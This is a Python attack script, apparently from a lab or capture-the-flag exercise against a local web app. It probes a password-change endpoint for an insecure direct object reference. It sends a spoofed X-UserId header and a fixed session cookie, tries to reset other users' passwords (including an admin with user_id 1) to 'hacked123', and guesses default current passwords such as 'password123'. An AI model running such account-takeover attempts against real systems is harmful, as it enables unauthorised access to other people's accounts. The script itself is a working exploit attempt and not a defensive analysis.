import requests
import json
import sys

BASE_URL = "http://127.0.0.1:33200"
CHANGE_PASSWORD_ENDPOINT = f"{BASE_URL}/password/test"
MY_USER_ID = "10032"
SESSION_COOKIE = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfPOA.b4xDl8YHos70T-UyrMaks8tnRhU"

# Try different parameter combinations to identify what's required
headers = {
    "X-UserId": MY_USER_ID,
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
}

cookies = {"session": SESSION_COOKIE}

# Test both user_id value and different username patterns
test_cases = [
    {"user_id": "10033", "username": "user10033", "description": "Matching username pattern"},
    {"user_id": "10033", "username": "victim", "description": "Victim username"},
    {"user_id": "1", "username": "admin", "description": "Admin user"},
    {"user_id": "1", "username": "user1", "description": "User 1 with pattern"},
]

print("[+] Testing different username and parameter combinations")
print(f"Endpoint: {CHANGE_PASSWORD_ENDPOINT}")
print("=" * 80)

for i, case in enumerate(test_cases, 1):
    print(f"\n[+] Test {i}: {case['description']}")
    print(f"user_id: {case['user_id']}, username: {case['username']}")
    
    # Test 1: Basic parameters
    data1 = {
        "username": case["username"],
        "password": "hacked123",
        "user_id": case["user_id"]
    }
    
    try:
        resp1 = requests.post(CHANGE_PASSWORD_ENDPOINT, headers=headers, cookies=cookies, 
                              data=data1, allow_redirects=False, timeout=10)
        print(f"Test 1 (Basic): Status {resp1.status_code}")
        if resp1.status_code == 302:
            print(f"  Redirect to: {resp1.headers.get('Location', 'N/A')}")
            if "error=Incorrect+password" in resp1.headers.get('Location', ''):
                print("  → Incorrect password error")
        
        # Test 2: Add current_password parameter
        data2 = {
            "username": case["username"],
            "current_password": "password123",  # Common default
            "password": "hacked123",
            "user_id": case["user_id"]
        }
        
        resp2 = requests.post(CHANGE_PASSWORD_ENDPOINT, headers=headers, cookies=cookies, 
                              data=data2, allow_redirects=False, timeout=10)
        print(f"Test 2 (With current_password): Status {resp2.status_code}")
        if resp2.status_code == 302:
            print(f"  Redirect to: {resp2.headers.get('Location', 'N/A')}")
            if "error=Incorrect+password" in resp2.headers.get('Location', ''):
                print("  → Still getting incorrect password error")
        
        # Test 3: Try with old_password instead
        data3 = {
            "username": case["username"],
            "old_password": "password123",
            "password": "hacked123",
            "user_id": case["user_id"]
        }
        
        resp3 = requests.post(CHANGE_PASSWORD_ENDPOINT, headers=headers, cookies=cookies, 
                              data=data3, allow_redirects=False, timeout=10)
        print(f"Test 3 (With old_password): Status {resp3.status_code}")
        if resp3.status_code == 302:
            print(f"  Redirect to: {resp3.headers.get('Location', 'N/A')}")
        
        # Check if any tests were more successful
        unique_responses = set()
        for resp in [resp1, resp2, resp3]:
            if resp.status_code == 302:
                unique_responses.add(resp.headers.get('Location', ''))
        
        if len(unique_responses) > 1:
            print(f"  → Different responses detected: {unique_responses}")
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
    
    print("-" * 60)

# Final test: What if we try changing our own password first to understand the flow?
print("\n[+] Testing self-service password change (user_id=10032, our own account)")
print("=" * 80)

# First, let's try to login with a guessed password to see what happens
login_data = {
    "username": "user10032",  # Assuming this is our username
    "password": "password123"  # Common default/guess
}

login_url = f"{BASE_URL}/login"
try:
    login_resp = requests.post(login_url, data=login_data, allow_redirects=False, timeout=10)
    print(f"Login attempt with user10032/password123: Status {login_resp.status_code}")
    if login_resp.status_code == 302:
        print(f"Redirect to: {login_resp.headers.get('Location', 'N/A')}")
except Exception as e:
    print(f"Login test failed: {e}")

# Now try changing our own password
self_service_data = {
    "username": "user10032",
    "password": "my_new_password123",
    "user_id": "10032"
}

try:
    self_resp = requests.post(CHANGE_PASSWORD_ENDPOINT, headers=headers, cookies=cookies,
                              data=self_service_data, allow_redirects=False, timeout=10)
    print(f"\nSelf-service password change: Status {self_resp.status_code}")
    if self_resp.status_code == 302:
        print(f"Redirect to: {self_resp.headers.get('Location', 'N/A')}")
        
        # If it redirects to error, we need to understand what parameter is wrong
        if "error" in self_resp.headers.get('Location', ''):
            print("  → Even self-service fails - suggests missing auth or wrong endpoint")
        elif "/dashboard" in self_resp.headers.get('Location', ''):
            print("  → Self-service works! Can now test other users.")
            # If we can change our password, we can test the IDOR again
            print("\n[!] Self-service password change successful - IDOR may exist!")
            
except requests.exceptions.RequestException as e:
    print(f"Self-service test failed: {e}")
